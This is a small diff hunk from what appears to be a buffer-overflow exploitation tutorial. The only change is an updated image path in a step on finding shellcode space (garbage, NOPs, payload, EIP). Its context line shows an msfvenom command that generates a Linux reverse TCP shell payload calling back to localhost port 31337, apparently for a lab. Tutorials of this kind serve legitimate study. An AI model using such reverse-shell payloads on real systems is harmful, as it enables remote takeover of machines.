@@ -69,7 +69,7 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform l
 
 #### 5 : Finding Shellcode Space : Garbage + NOPs + Payload + EIP
 
-![](<../.gitbook/assets/image (2) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1).png>)
 
 ```bash
     # Pre-final padding (Garbage - NOPs - Payload - EIP)
